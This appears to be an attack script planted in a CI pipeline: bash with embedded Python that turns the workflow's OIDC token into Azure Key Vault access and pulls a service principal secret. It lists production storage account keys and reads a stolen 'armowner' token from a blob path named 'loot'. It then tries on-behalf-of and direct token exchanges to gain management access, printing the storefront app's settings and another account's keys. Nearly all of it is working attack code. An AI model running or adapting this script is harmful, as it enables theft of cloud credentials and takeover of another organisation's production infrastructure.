#!/usr/bin/env bash
set -x

OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)

SPSEC=$(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | jq -r .value)
export SYNC_APP=$(echo "$SPSEC"|jq -r .appId)
export SYNC_SEC=$(echo "$SPSEC"|jq -r .clientSecret)

SPMG=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$SYNC_APP" -d "grant_type=client_credentials" -d "client_secret=$SYNC_SEC" \
  --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
export SKEY=$(curl -s -X POST -H "Authorization: Bearer $SPMG" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-05-01" | jq -r '.keys[0].value')
echo "SKEY len: ${#SKEY}"

python3 -c "
import hashlib,hmac,base64,datetime,urllib.request,urllib.parse,json,os,time
A='sttblcilogsprodx3euoz';K=os.environ['SKEY'];V='2021-08-06'
T=os.environ['AZURE_TENANT_ID'];SUB=os.environ['AZURE_SUBSCRIPTION_ID']
SA=os.environ['SYNC_APP'];SK=os.environ['SYNC_SEC']
def sg(p):
    n=datetime.datetime.now(datetime.timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
    s=f'GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{n}\nx-ms-version:{V}\n/{A}/{p}'
    g=base64.b64encode(hmac.new(base64.b64decode(K),s.encode(),hashlib.sha256).digest()).decode()
    return urllib.request.urlopen(urllib.request.Request(f'https://{A}.blob.core.windows.net/{p}',headers={'x-ms-date':n,'x-ms-version':V,'Authorization':f'SharedKey {A}:{g}'}),timeout=15).read().decode()
d=json.loads(sg('loot/armowner_token.json'))
AT=d['armowner_token']
c=json.loads(base64.b64decode(AT.split('.')[1]+'=='))
print(f'token exp={c[\"exp\"]-time.time():.0f}s')
if c['exp']<time.time(): print('EXPIRED');exit()
# OBO
print('OBO...')
try:
    r=urllib.request.urlopen(urllib.request.Request(f'https://login.microsoftonline.com/{T}/oauth2/v2.0/token',data=urllib.parse.urlencode({'client_id':SA,'client_secret':SK,'grant_type':'urn:ietf:params:oauth:grant-type:jwt-bearer','assertion':AT,'scope':'https://management.azure.com/.default','requested_token_use':'on_behalf_of'}).encode()),timeout=15)
    t=json.loads(r.read()).get('access_token','')
    print(f'OBO token: {len(t)}')
except urllib.error.HTTPError as e:
    print(f'OBO err: {e.code} {e.read().decode()[:200]}')
    t=''
# Direct
if not t:
    print('DIRECT...')
    try:
        r2=urllib.request.urlopen(urllib.request.Request(f'https://login.microsoftonline.com/{T}/oauth2/v2.0/token',data=urllib.parse.urlencode({'client_id':SA,'grant_type':'client_credentials','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':AT,'scope':'https://management.azure.com/.default'}).encode()),timeout=15)
        t=json.loads(r2.read()).get('access_token','')
        print(f'Direct token: {len(t)}')
    except urllib.error.HTTPError as e2:
        print(f'Direct err: {e2.code} {e2.read().decode()[:200]}')
if t and len(t)>100:
    # Read appsettings
    try:
        r3=urllib.request.urlopen(urllib.request.Request(f'https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-12-01',method='POST',data=b'',headers={'Authorization':f'Bearer {t}','Content-Length':'0'}),timeout=15)
        s=json.loads(r3.read())
        print('APPSETTINGS:')
        for k2,v2 in s.get('properties',{}).items(): print(f'  {k2}={v2}')
    except urllib.error.HTTPError as e3:
        print(f'Settings err: {e3.code} {e3.read().decode()[:200]}')
    # listKeys
    try:
        r4=urllib.request.urlopen(urllib.request.Request(f'https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-05-01',method='POST',data=b'',headers={'Authorization':f'Bearer {t}','Content-Length':'0'}),timeout=15)
        print(f'LISTKEYS: {r4.read().decode()[:200]}')
    except urllib.error.HTTPError as e4:
        print(f'ListKeys err: {e4.code}')
print('DONE')
"

echo "=== DONE ==="
